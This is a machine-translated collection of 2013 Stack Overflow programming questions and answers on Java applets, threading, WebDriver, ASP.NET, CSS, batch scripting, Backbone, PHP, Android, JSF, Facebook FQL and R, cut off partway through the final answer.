我们使用部署在信息亭类型环境中的 Firefox 18.0.1 来运行签名的小程序。JDK 和 JRE 都是 JavaSE 7u11。签名的 jar 让我们可以完成沙盒小程序通常无法为其用户做的所有事情（漫游本地磁盘、与打印机通信、窃取他们的所有 pr0n 等）。

小程序和加载它的页面共同生成一些 HTML 和 JavaScript；然后 JavaScript 和小程序以一种几乎无缝的方式来回交谈。有时小程序会创建弹出对话框；这些要么由用户单击 Java 组件触发，要么由用户单击某些带有“onclick”脚本的 HTML 小部件触发，该脚本告诉小程序进行对话。

在上周，我注意到一些小程序的弹出对话框有些奇怪。他们在对话框外挂着**一个小警告图标：**

![小小的砰砰](../Images/e47b8b40673ad1dd73917a2636899b68.png)

如果用户移动它，该图标将粘在对话框上。将鼠标悬停在图标上会弹出一个小的“Java Applet Window”工具​​提示，这特别有趣，因为并非我们所有的对话框都与它一起出现。

该快照中显示的窗口是使用此测试代码创建的。（是的，使用 JOptionPane 有更短的方法，但它不会复制我们的实际代码。一些对话框比其他对话框更定制。）

```
import java.awt.BorderLayout;

import javax.swing.JApplet;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

public class WhereTheHellDoesTheIconComeFrom
{
    private JPanel topPanel;

    public WhereTheHellDoesTheIconComeFrom (JApplet applet) {
        // Multiple panels with a text blob in each
        JLabel exampleText = new JLabel ("some text here", JLabel.CENTER);
        topPanel = new JPanel (new BorderLayout(5,0));
        topPanel.add (exampleText, BorderLayout.CENTER);

        // Create the options pane.
        Object allpanels[] = new Object[] {
            topPanel,
        };
        Object buttons[] = { "B1", "B2" };

        JOptionPane optionPane = new JOptionPane (allpanels,
            JOptionPane.PLAIN_MESSAGE,
            JOptionPane.OK_CANCEL_OPTION,
            null,   // no icon built in
            buttons,
            buttons[0]);  // select this button by default

        // Ask it for the visible popup.
        JDialog dialog = optionPane.createDialog(
            SwingUtilities.getWindowAncestor(applet),
            "This is the title text");
        dialog.setResizable(false);
        dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
        dialog.pack();
        dialog.setLocationRelativeTo(null);
        dialog.setVisible(true);
        // Modal dialog blocks on the previous line; at this point I can
        // examine getValue() and make decisions, etc, etc.
    }
} 
```

我花了大约一个小时与 Google 相处，希望它能向我揭示一些东西，但我找不到任何关于此的提及。这是 Firefox 的事情还是 JRE 的事情？或者，更好的问题：是什么导致警告图标出现在某些对话框而不是其他对话框上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:25:49.727

嗯，现在我觉得很傻。我已经玩了几个小时了，一无所获，在这里发布了问题，去拿了我的第 14 杯咖啡，然后在搅拌奶油的同时得到了答案。区别如下：

用户单击签名的小程序小部件直接触​​发的弹出窗口是“正常的”。

用户单击 HTML/JavaScript 对象触发的弹出窗口以及调用已签名 Java 函数的“onclick”脚本会被标记为警告。

每当 javascript 函数调用已签名的小程序时，该小程序在调用期间被视为未签名。这可能是一个类似的预防措施生效，但我还没有真正证实这一点。在这两种情况下，解决方案都是相同的：找到需要“不，这是安全的，我是认真的”状态的**最小**`PrivilegedExceptionAction`代码段，然后将其包裹起来。或者至少，这是其他 javascript-into-signed-applet 调用的正确解决方案，所以我在这里尝试了它并且它有效。:-)

在我们的真实代码中，显示对话框的部分（从`createDialog`后面）在它自己的函数中。用对该函数的调用替换对该函数的调用并对该函数进行`AccessController.doPrivileged()`包装调用可以处理所有事情。不再有警告图标！

# synchronization - 实现锁和阻塞线程

> ID：14469440
> 
> 赞同：0
> 
> 时间：2013-01-22T22:43:50.700
> 
> 标签：synchronization, operating-system, thread-safety, locking, block

如果一个线程试图获取一个锁并被占用，它应该进入睡眠状态并保持睡眠状态直到锁被释放。如果一个线程释放了一个锁（它被创建它的线程占用），它应该唤醒线程。

我的问题是，如果我们唤醒锁定地址上的所有线程与锁定地址上的单个线程（锁定释放后），这有什么不同吗？如果我们要唤醒一个线程，那么唤醒哪个线程有意义，第一个在锁定地址上进入睡眠状态？

我可以看到唤醒一个线程的一些优势，如果我们唤醒所有线程，n-1 可能会重新进入睡眠状态。但是我不知道唤醒单个线程是否有缺点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T05:09:33.677

我相信您将 Windows 锁（互斥锁，关键部分）与 .Net 监视器（在 C# 中可以使用关键字 lock 作为进入/退出块的语法糖）混淆。

Windows 互斥锁和临界区只能进入和退出，即只有一个与它们关联的队列。队列中的所有线程都等待锁被释放，当这种情况发生时，队列中的下一个线程将控制锁并开始运行。这一切都是自动发生的。当前持有锁的线程与此无关，它不能选择唤醒一个或多个等待释放锁的其他线程。

.Net 的 Monitor 有两个队列：就绪队列和等待队列。

就绪队列的行为与 Win32 Mutex 或临界区队列完全相同，并使用 Enter/Leave 方法进行控制。

等待队列是使用 Wait/Pulse/PulseAll 方法控制的单独队列。这些方法只能由持有 Monitor 的线程调用。当线程调用 Wait 时，它会释放 Monitor 并进入等待队列。然后另一个线程可以调用 Pulse 来移动一个线程，或者调用 Pulse All 来将所有线程从等待队列移动到就绪队列（记住调用 Pulse/PulseAll 的线程持有 Monitor。）

从计算机科学的角度来看，监视器是同步线程所需的单个原语（信号量、事件、互斥体、屏障等都可以用监视器来实现），从实际的角度来看，监视器可用作互斥体，并且适用于以下情况动作需要由两个线程以锁步执行。然而，大多数时候代码在使用事件时更具可读性。

进一步阅读：

[关于历史/计算机科学方面的监视器的维基百科页面](http://en.wikipedia.org/wiki/Monitor_%28synchronization%29)

[MSDN 监视器类](http://msdn.microsoft.com/en-AU/library/system.threading.monitor.aspx)

# javascript - 有没有办法使用 WebDriver 自动触发 setTimeout 事件？

> ID：14469441
> 
> 赞同：1
> 
> 时间：2013-01-22T22:43:58.297
> 
> 标签：javascript, selenium, webdriver, chromium

我想对一些有一堆 setTimeout 代码的页面进行测试。一种选择是让我等到此代码运行，但理想情况下，我想在页面加载后强制代码运行。

我想到的一种方法是在评估页面之前将以下内容注入到页面中：

```
var originalSetTimeout = window.setTimeout;
window.setTimeout = function(a, t) {
    originalSetTimeout(a, 0);
} 
```

我不确定*如何*做到这一点，或者是否有更好的方法我忽略了。

请注意，在我正在测试的页面上删除 setTimeout 代码不是一个选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T13:24:06.010

当你做一个

```
driver.get('http://mypage.com') 
```

WebDriver 将等待页面加载完毕。一旦完成，你就可以做

```
driver.execute_script('var originalSetTimeout = window.setTimeout;
                      window.setTimeout = function(a, t) {
                         originalSetTimeout(a, 0);
                      }') 
```

这可能会做你想要的，**应该**尽快运行。

# c# - 使用 URL 路由在 ASP.NET 4.0 中验证视图状态 MAC 失败

> ID：14469444
> 
> 赞同：1
> 
> 时间：2013-01-22T22:44:09.293
> 
> 标签：c#, asp.net, web, iis-6, webforms

我得到了臭名昭著的错误

```
Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey and validation algorithm. AutoGenerate cannot be used in a cluster. 
```

经过广泛的搜索，我找不到任何可以解决我的特定问题的东西。我在 .NET 4 中使用 URL 路由，但我没有使用 MVC。我发现的所有类似的问题/解决方案（由于 URL 路由）都在 MVC 中提供了解决方案，但在常规 ASP.NET Web 窗体中却没有。

[这里](https://stackoverflow.com/questions/230014/postback-not-working-with-asp-net-routing-validation-of-viewstate-mac-failed)的堆栈溢出问题指出：

> 它似乎与url中的子路径数有关。如果至少有 2 个子路径，则视图状态验证失败。

在测试这个理论时，我能够提供一个快速而肮脏的解决方法，只需将我的路线从

`Module/Search/Results`

到

`Module/SearchResults`

这暂时解决了这个问题，但是，该帖子中的任何答案都没有帮助。

我发现了一些有趣的东西，该错误可以在 IE9 中重现，但不能在 Chrome 24.0.1313.52m 中重现。这让我相信这个错误是特定于浏览器的，所以我尝试为我的网站设置 NoCache，但无济于事，Chrome 仍然有效，IE9 仍然抛出 ViewState 错误。

为了重现该问题，以下是我的环境的一些关键因素：

```
Windows 7 64-bit
IIS 6.1 SP 1
Local Web Project (VS 2010)
Nested Master Pages (3 levels)
URL Routing (defined in Global.asax)
Page contains a GridView with a TemplateField.  
GridView has PagerSettings defined.
Links causing the error are within the TemplateField.
Links outside of the GridView do not cause the error. 
```

重现步骤如下：

```
User browses to page "~/Module/Search/Results" (from link or directly doesn't matter)
User clicks on a button that posts back and causes a redirect to another page "~/Module/DoSomething"
User presses the Back button in the browser which takes them back to "~/Module/Search/Results"
User then proceeds to press a button that causes a post-back which immediately causes the error. 
```

> **更新：** 在有关页面布局的关键因素中添加了信息。

如何为所有浏览器解决此问题，以便我可以在网页的 URL 中有 2 个或更多子路径，而不会在用户返回页面然后生成另一个回发时导致错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-25T16:42:22.053

我想到了！

在尝试解决出现错误的问题时

> Microsoft JScript 运行时错误：“WebForm_FireDefaultButton”未定义

我发现一篇文章说我需要将以下内容添加到路由表的顶部

> routes.Ignore("{resource}.axd/{*pathInfo}");

这似乎已经解决了我正在寻找的问题和这个问题中的问题。

# responsive-design - 响应式设计和定位：绝对

> ID：14469445
> 
> 赞同：0
> 
> 时间：2013-01-22T22:44:12.227
> 
> 标签：responsive-design

有什么建议您如何使用 position:absolute 响应式设计？

我有一个宽度为 1000px 的设计，从那个容器 div(1000px) 离开我有图像，定位为 position: absolute。

问题是，当我减小浏览器的宽度时，我会得到水平滚动。

使用响应式设计定位绝对 div 的正确方法是什么？

编辑：这是我正在谈论的一个例子[http://jsfiddle.net/FeAUr/](http://jsfiddle.net/FeAUr/)。出于示例的目的，我将容器宽度设置为 100 像素，而不是 1000 像素。

关键是，由于带有图片的“绝对”元素，当我减小浏览器的宽度时，我会得到水平滚动条。我怎样才能以正确的方式做到这一点，我不会得到水平滚动条？

```
<div class="bggrey">

    <div class="absolute-left"><img src="http://placehold.it/200x200" /></div>
    <div class="row">content</div>

</div>

.bggrey{
    width: 100%;
 background: #999;   
    height:500px;
}

.row{
 width:100px;   
    height:500px;
    background: #fff;
    margin: auto;
}

.absolute-left{
    position:absolute;
    left:50%;
    margin-left:-300px;
    width:200px;
    height:100px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-06T18:44:37.867

我通过为背景制作另一个 div 并将图像作为背景图像来实现这一点。使用 zurb 基金来响应图像也有帮助。

# windows - if 语句被执行，即使条件批量错误

> ID：14469450
> 
> 赞同：1
> 
> 时间：2013-01-22T22:44:23.267
> 
> 标签：windows, windows-7, batch-file

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T05:16:19.457

有一些批次的复杂性会导致您的问题。

1) 括号内的块被解析一次。在执行 IF 测试之前，您的整个 IF 块必须解析为有效的语法。

2) 如果变量未定义，子字符串扩展会做一些奇怪的事情。解析器扩展`%var:`为空，留下子字符串表达式的其余部分，并且行解析变得完全不同步。

```
IF %var:~-2,1%==\ SET var=%var:~0,-2%" 
```

First`%var:`扩展为空，留下`IF ~-2,1%==\ SET var=%var:~0,-2%"`
Next`%==\ SET var=%`扩展为空，离开`IF ~-2,1var:~0,-2%"`
Final，孤`%`没有配对，所以被剥离。
展开后的最后一行是 now `IF ~-2,1var:~0,-2"`，这是无效的语法。

有关扩展如何工作的详细说明，请参阅[https://stackoverflow.com/a/7970912/1012053 。](https://stackoverflow.com/a/7970912/1012053)`%`

您的代码可以通过 2 个非常不直观的更改来“修复”：1）颠倒比较的顺序，2）在 SET 语句周围添加转义引号，以及 3）添加一些额外的文本：

```
if "\"=="%var:~-2,1%" SET ^"var=%var:~0,-2%"^" ignore 
```

如果 var 未定义，则上述扩展为：

```
if "\" == "~-2,1var:~0,-2"" ignore 
```

重要的是解析的语法是有效的。之所以需要，`ignore`是因为 IF 语句在条件之后需要一个命令，以便解析器将其视为有效。如果执行它会导致错误，因为`ignore`它不是一个有效的命令。但它永远不会被执行，因为条件为 FALSE（外部 IF 条件也为假）。

如果 var 被定义，比如值为`"test\"`，那么该行将按照您的想法进行扩展：

```
if "\" == "\" SET "var=test" ignore 
```

由于引用了 SET 赋值的方式，上面的代码执行得很好。最后引用之后的任何内容都将被忽略。

我说上面会“修复”你的代码，但我相信有更好的方法来完全重构你的代码。

**更新：重组建议**

在我看来，好像您只是想将变量设置为带引号的参数的值，并且如果值中的最后一个字符（不包括引号）是`\`，则删除该字符。看起来您还插入了一些测试代码，以尝试诊断代码不起作用的原因。放弃测试代码，我推荐以下内容：

```
set var=%6
set "test=%var:~-2,1%"
if "%test%"=="\" set var=%var:~0,-2%" 
```

我了解必须如何引用文件名和路径以保留空格。但我不喜欢在我的变量值中包含引号。我喜欢从我的参数中去掉引号，然后只在需要时添加它们。所以我的代码看起来像：

```
set "var=%~6"
set "test=%var:~-1,1%"
if "%test%"=="\" set "var=%var:~0,-1%" 
```

如果启用了延迟扩展，那么简单的解决方案不再需要测试变量：

```
set var=%6
setlocal enableDelayedExpansion
if "!var:~-2,1!"=="\" set "var=!var:~0,-2!"" 
```

或者，如果剥离封闭引号：

```
set "var=%~6"
setlocal enableDelayedExpansion
if "!var:~-1,1!"=="\" set "var=!var:~0,-1!" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T15:04:46.153

我建议使用扩展能力`defined`和**dbenham**所说的一切。

```
@ECHO off
SET "var=%6"
IF NOT DEFINED var (
    ECHO "ijklkmn"
    EXIT
)
IF "%var:~-2,1%"=="\" SET "var=%var:~0,-2%"" 
```

# css - css arrange buttons in columns

> ID：14469466
> 
> 赞同：0
> 
> 时间：2013-01-22T22:45:47.750
> 
> 标签：css, button, alignment

I'm creating an html page which controls a robot, and I'm trying to get the layout nice.

At the moment there is a live video feed and below it a single column of 8 buttons. These buttons have CSS attributes which change their colour when they're clicked etc. I just want to be able to move the buttons to arrange them in a grid, or set of columns.

How do I do this? Do I need to use CSS to create some columns, or is it more difficult as I'm positioning buttons not text?

Current HTML:

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content = "height = device-height, width = 420, user-scalable = no" /> 
    <title>WebIOPi | Demo</title>
    <script type="text/javascript" src="/webiopi.js"></script>
    <script type="text/javascript">
    webiopi().ready(function() {
        var content, button;
        content = $("#content");

        // create a "FORWARDS" labeled button for GPIO 7
        button = webiopi().createGPIOButton(7, "FORWARDS");
        content.append(button); // append button to content div

        // create a "REVERSE" labeled button for GPIO 8
        button = webiopi().createGPIOButton(8, "REVERSE");
        content.append(button); // append button to content div

        // create a "STEER LEFT" labeled button for GPIO 24
        button = webiopi().createGPIOButton(9, "STEER LEFT");
        content.append(button); // append button to content div

        // create a "STEER RIGHT" labeled button for GPIO 24
        button = webiopi().createGPIOButton(10, "STEER RIGHT");
        content.append(button); // append button to content div

        // create a "ROTATE LEFT" labeled button for GPIO 24
        button = webiopi().createGPIOButton(11, "ROTATE LEFT");
        content.append(button); // append button to content div

        // create a "ROTATE RIGHT" labeled button for GPIO 24
        button = webiopi().createGPIOButton(23, "ROTATE RIGHT");
        content.append(button); // append button to content div

        // create a "SHIFT UP" labeled button for GPIO 24
        button = webiopi().createGPIOButton(24, "SHIFT UP");
        content.append(button); // append button to content div

        // create a "SHIFT DOWN" labeled button for GPIO 25
        button = webiopi().createGPIOButton(25, "SHIFT DOWN");
        content.append(button); // append button to content div

    });

    </script>
    <style type="text/css">
        button {
            display: block;
            margin: 5px 5px 5px 5px;
            width: 200px;
            height: 45px;
            font-size: 16pt;
            font-weight: bold;
            color: black;
        }

        input[type="range"] {
            display: block;
            width: 160px;
            height: 45px;
        }       
        #gpio7.LOW {
            background-color: White;
        }       
        #gpio7.HIGH {
            background-color: Green;
        }
        #gpio8.LOW {
            background-color: White;
        }       
        #gpio8.HIGH {
            background-color: Red;
        }
        #gpio9.LOW {
            background-color: White;
        }       
        #gpio9.HIGH {
            background-color: Green;
        }
        #gpio10.LOW {
            background-color: White;
        }       
        #gpio10.HIGH {
            background-color: Green;
        }
        #gpio11.LOW {
            background-color: White;
        }       
        #gpio11.HIGH {
            background-color: Yellow;
        }
        #gpio23.LOW {
            background-color: White;
        }       
        #gpio23.HIGH {
            background-color: Yellow;
        }
        #gpio24.LOW {
            background-color: White;
        }       
        #gpio24.HIGH {
            background-color: Blue;
        }
        #gpio25.LOW {
            background-color: White;
        }       
        #gpio25.HIGH {
            background-color: Blue;
        }

    </style>
</head>
<body>
    <div style="text-align:center;"><img src="http://192.168.0.14:8080/?action=stream" width="640" height="480"></div>  
    <div style="text-align:center;"><img src="http://goo.gl/S0jnL" width="200" height="200"></div>
    <div id="content" align="center"></div> 
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-26T23:32:21.433

I added float:Left; to the CSS and the buttons are now horizontally aligned:

```
#controls button {
display: block;
margin: 20px 20px 20px 20px;
width: 60px;
height: 20px;
font-size: 8pt;
font-weight: bold;
color: white;
float:left; 
```

My application is similar to yours...live video with GPIO buttons around the border. I'm no expert, just sharing what I have discovered. I hope this helped...

# internet-explorer - Backbone.history：深层网址在 IE 中没有正确支持

> ID：14469467
> 
> 赞同：1
> 
> 时间：2013-01-22T22:45:50.467
> 
> 标签：internet-explorer, backbone.js, pushstate, singlepage, html5-history

在我的单页主干应用程序中，我无法让较长的网址在 IE 中正确路由。任何嵌套多于一层的 url 在直接加载它们时都不会收到正确的 hash fallbak。

**顶级网址工作正常...**

```
when I load: domain.com/resource
in IE I get: domain.com/#resource (as expected) 
```

**导航（应用内）工作正常......**

```
when I click on a link to: domain.com/resource/12345
IE sends me to: domain.com/#resource/12345 (as expected) 
```

**但是访问更深的 url 会直接破坏页面**

```
when I load: domain.com/resource/12345
in IE I get: domain.com/resource/12345 !! this is incorrect, and the page doesn't load 
```

更新：

这是IE9

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T02:43:33.987

我不确定您是否在过去 3 小时内更改了您的分期，但我观察到的问题与此问题有关

[IE 在引用 CSS 文件时不支持基本元素中的相对路径](https://stackoverflow.com/questions/6541721/ie-doesnt-support-relative-paths-in-the-base-element-when-referencing-css-files)

当您的页面请求[http://stage.change4cancer.org/profile/647955793](http://stage.change4cancer.org/profile/647955793)时，它会获取页面的实际 html。现在它是否应该重定向到#profile/647955793 是另一回事（为什么在你已经加载内容之后要这样做，我不确定），但让我解释一下。

[在来自http://stage.change4cancer.org/profile/647955793](http://stage.change4cancer.org/profile/647955793)的html 中，您有以下标签：

```
<base href="/" /> 
```

但 IE9 不会尊重该标签，除非它具有完整的 URI。因此，所有到 JS、CSS 等的路径都是错误的。代替

[http://stage.change4cancer.org/js/libs/backbone-0.9.2.min.js](http://stage.change4cancer.org/js/libs/backbone-0.9.2.min.js)

它在请求

[http://stage.change4cancer.org/profile/js/libs/backbone-0.9.2.min.js](http://stage.change4cancer.org/profile/js/libs/backbone-0.9.2.min.js)

它实际上返回了另一个 html 页面

由于您的任何外部 JS 都没有加载，因此当然会出错。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-29T17:15:18.447

试试这个：

```
Backbone.history.start({ pushState: Modernizr.history, silent: true });
if(!Modernizr.history) {
    var rootLength = Backbone.history.options.root.length;
    var fragment = window.location.pathname.substr(rootLength);
    var search = window.location.search;
    Backbone.history.navigate('/#' + fragment + search, { trigger: true });
} else {
    Backbone.history.loadUrl(Backbone.history.getFragment())
} 
```

# php - 如何拆分一个数组以将其插入另一个数组以进行 SQL 查询？

> ID：14469471
> 
> 赞同：1
> 
> 时间：2013-01-22T22:45:56.463
> 
> 标签：php, mysql, arrays, while-loop

我有数组 $total，如 pint_r 所示：

```
Array
(
[0] => 1,2,3,4,5,6,7,8,9,10,11,12,1
[1] => 13,14,15,16,17,18,19,20,21,22,23,24,1
[2] => 25,26,27,28,29,30,31,32,33,34,35,36,1
[3] => 37,38,39,40,41,42,43,44,45,46,47,48,1
[4] => 49,50,51,52,53,54,55,56,57,58,59,60,1
[5] => 61,62,63,64,65,66,67,68,69,70,71,72,1
[6] => 73,74,75,76,77,78,79,80,81,82,83,84,1
[7] => 85,86,87,88,89,90,91,92,93,94,95,96,1
[8] => 97,98,99,100,101,102,103,104,105,106,107,108,1
[9] => 109,110,111,112,113,114,115,116,117,118,119,120,1
[10] => 121,122,123,124,125,126,127,128,129,130,131,132,1
[11] => 133,134,135,136,137,138,139,140,141,142,143,144,1
[12] => 145,146,147,148,149,150,151,152,153,154,155,156,1
[13] => 157,158,159,160,161,162,163,164,165,166,167,168,1
[14] => 169,170,171,172,173,174,175,176,177,178,179,180,1
[15] => 181,182,183,184,185,186,187,188,189,190,191,192,1
[16] => 193,194,195,196,197,198,199,200,201,202,203,204,1
[17] => 205,206,207,208,209,210,211,212,213,214,215,216,1
[18] => 217,218,219,220,221,222,223,224,225,226,227,228,1
[19] => 229,230,231,232,233,234,235,236,237,238,239,240,1
[20] => 241,242,243,244,245,246,247,248,249,250,251,252,1
[21] => 253,254,255,256,257,258,259,260,261,262,263,264,1
[22] => 265,266,267,268,269,270,271,272,273,274,275,276,1
[23] => 277,278,279,280,281,282,283,284,285,286,287,288,1
) 
```

我的目标是进行 SQL 插入查询，将这些数字中的每一个输入到 MYSQL 表中，每个数字 2 一行。以在 PortNUMbers 列中标记为 1-288 的 288 行的表结尾（请忽略尾随的 1，当我运行 sort() 时，它似乎已经标记为顺风顺水）所以这是我的 SQL：

```
$sqlinsert='
    INSERT INTO '.$tbl_name.'
    (PortNumber) VALUES (1),(2),(3)etc..'; 
```

非常简单，我只是将其分解，然后将其放入 while 循环中，然后为查询内爆，但是我需要以相当奇怪的顺序插入值，如下所示：

```
(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(145),(146),(147),(148),(149),(150),(151),(152),(153),(154),(155),(156) 
```

依此类推，遵循相同的模式，直到结束。有人对我如何实现这一目标有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:59:25.613

SQL 表没有隐式顺序。您不应该依赖插入值的顺序是查询它们时返回它们的顺序。您必须使用`ORDER BY`才能获得可靠的查询结果顺序。

如果您需要记录输入数据的顺序，则需要另一列。

例如：

```
CREATE TABLE TblName (
  id INT AUTO_INCREMENT PRIMARY KEY,
  PortNUmber INT NOT NULL
);

INSERT INTO TblName (PortNumber) VALUES
(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12);
...etc... 
```

自动增量将保留您插入值的顺序，然后您可以根据需要以相当奇怪的顺序而不是数字顺序插入值。

# android - 从 eclispe 执行应用到 HTC Hero

> ID：14469477
> 
> 赞同：0
> 
> 时间：2013-01-22T22:46:14.793
> 
> 标签：android, eclipse, debugging, device

在我的开发过程中，我已经到了在实际设备上测试应用程序的时候了，所以我尝试在我的旧 HTC Hero 上进行测试。

我已经按照这个链接的 android 开发者网站上的说明进行操作：http: [//developer.android.com/training/basics/firstapp/running-app.html](http://developer.android.com/training/basics/firstapp/running-app.html) 每次我去“运行”它告诉我的应用程序有“未找到有效的兼容 AVD 或设备。连接设备或启动 AVD 后重新启动此配置。”

当我查看应用程序的设置时，它是为 Android 2.1 (api 7) 配置的，而 HTC Hero 是 Android 2.1 (update-1)。我已经进入手机上的设置>应用程序>开发并将其设置为允许通过USB进行调试。

因此，我真的很难找出如何解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:50:09.483

确保手机设置为文件模式（例如，您可以像打开另一个磁盘驱动器一样打开它）。某些模式可以阻止 adb 拾取它。如果是版本问题，Eclipse 会这样说，它不会只是不显示任何设备。

要排除它是 Eclipse 中的配置问题，您应该能够在命令行中调用“adb logcat”（在平台工具/adb.exe 下的 android-sdk 目录中找到 adb），它应该吐出日志您的手机（而不是说“等待设备”之类的话）。

最后，您可能需要某些手机的特定驱动程序（例如 HTC Sync）。如果你在 linux 上，你可以为它设置 udev 规则[http://developer.android.com/tools/device.html#setting-up](http://developer.android.com/tools/device.html#setting-up)

# php - 让 PHP 编写干净的 html

> ID：14469482
> 
> 赞同：0
> 
> 时间：2013-01-22T22:46:33.740
> 
> 标签：php

我的 PHP 倾向于以非常长的、难以阅读的 html 输出 html。

如果我的 PHP 写成：

```
<?php 
     echo "<li>";
     echo "<strong>Hello</strong>";
     echo "</li>";
?> 
```

它像这样输出HTML

```
<li><strong>Hello</strong></li> 
```

哪个看起来那么糟糕，但想象一下，如果那是在一个`foreach`循环中，它输出了那个变体，都在一条线上..

有没有办法让我的 PHP 以整齐的 HTML 格式输出？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:49:28.417

有：在输出中包含空格（例如，`\n`在每个标签之后添加）。

但是，这样做确实是徒劳的。如果您想自己查看 HTML，请使用 HTML 漂亮的打印机（或使用浏览器开发工具中包含的打印机）。如果它是为浏览器设计的，浏览器不在乎。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:07:18.623

使用[SMARTY 之](http://www.smarty.net/)类的模板引擎。这将允许您将所有 html 保存在与 PHP 完全不同的文件中（它确实编译为 PHP）。这将提高所有代码的可读性。然后，您可以以任何您认为合适的方式格式化 html。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:49:40.017

您可以使用 \n 进行换行。

```
<?php 
     echo "<li>\n";
     echo "<strong>Hello</strong>\n";
     echo "</li>\n";
?> 
```

但是为什么要花时间在上面呢？如果您使用 html 源代码作为调试工具，Chrome 详细信息控制台将对其进行修复。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:52:20.017

这是否好是主观的，但它有效：

```
<?php
    for ($i = 0; $i < 5; $i++)
    {
?>
<li><strong>Hello</strong></li>
<?php
    }
?> 
```

我想在这里说明的是，您可以进出 PHP 模式，因此如果您有很长的 HTML 链，您可以将它们格式化，而不是`echo`全部格式化。

# jsf - JSF 和 XHTML 文件 - 浏览器接收完整的源代码，其中 jsf 元素未被 glassfish 处理

> ID：14469483
> 
> 赞同：1
> 
> 时间：2013-01-22T22:46:45.930
> 
> 标签：jsf, netbeans, glassfish, java-ee-6, facelets

好的，所以问题是 - 我在 netbeans 中创建了一个新的 EJB 项目。我在 web 应用程序中创建了一个新的 .xhtml 文件，我已将其映射到 web.xml 作为项目的欢迎文件。

内容`index.xhtml`：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html">

    <h:head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>TODO supply a title</title>
    </h:head>
    <h:body>
            <p>test1</p>
           <h:outputText value="test2"/>
    </h:body>
</html> 
```

所以我运行这个项目。在我的浏览器 (Firefox 18) 中打开一个新页面，我看到的只是……除了“test1”之外没有别的。所以我在页面上单击鼠标右键，“查看页面源代码”，我就可以看到 index.xhtml 中写的确切内容。这就像 glassfish 在我写的时候明确地把页面扔给我一样。

glassfish 日志中没有抛出错误。那里都清楚。

内容`web.xml`如下：

```
<servlet>
    <servlet-name>Faces Servlet</servlet-name>
    <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
    <load-on-startup> 1 </load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>Faces Servlet</servlet-name>
    <url-pattern>*.xhtml</url-pattern>
</servlet-mapping>
   <welcome-file-list>  
        <welcome-file>/index.xhtml</welcome-file>  
    </welcome-file-list>  

    <session-config>
        <session-timeout>
            30
        </session-timeout>
    </session-config> 
```

所以，拜托，谁能告诉我，我做错了什么？

# facebook-graph-api - 将访问令牌附加到 FQL 查询

> ID：14469485
> 
> 赞同：1
> 
> 时间：2013-01-22T22:46:52.820
> 
> 标签：facebook-graph-api, facebook-fql, access-token

有没有办法将我的长期访问令牌附加到[使用 fql 获取 Facebook 事件中](http://facebook.stackoverflow.com/questions/10902259/getting-facebook-events-using-fql)给出的查询？该链接的查询是

```
fql?q={"event_info":"SELECT name,description, pic_small,pic_big, eid,venue,location from event WHERE eid in (SELECT eid FROM event_member WHERE uid = me())", "event_venue":"SELECT name, username, page_id, location FROM page WHERE page_id IN (SELECT venue.id FROM #event_info)"} 
```

提前感谢您的任何帮助...

**更新**- 提供的答案就像一个魅力。谢谢你！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:57:47.150

是的。试试这个：

```
/fql?q=QUERY&access_token=TOKEN 
```

# r - R问题“找不到对象”

> ID：14469486
> 
> 赞同：0
> 
> 时间：2013-01-22T22:46:53.037
> 
> 标签：r

我是 R 的新手。上周我有一个漫长而复杂的功能完美地工作。该程序让我选择一个列子集并对该子集进行各种操作。该函数必须工作 'function(arg1=first_header_name, arg2=second_header_name,....)'。我已经清除了控制台，删除了旧的历史文件。我再次阅读了手册，检查了 .csv 文件以确保所有内容仍然相同。我已经回去一步一步地重新设计它，我有这个新问题发生的地方。由于它是一个很长的函数，我只会在突然无法工作的部分的简化版本中重现它。

```
 elbow <- function(arg1,arg2) {
   my_data <- read.csv("data.csv", header=TRUE, sep=",") 
   average_A <- (arg1 + arg2)
   average_A
 }
 elbow(A3,A5)
 # Error in elbow(A3, A5) : object 'A3' not found 
```

列标题为 A3,A4,A5,A7,A8,A9,B2,B3,B5,B6,B7,B9

我犯了什么愚蠢的小错误？这让我发疯。它必须是微不足道的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-22T23:05:45.130

这是我对可能以您想要的方式工作的猜测：

```
elbow <- function(arg1,arg2) {
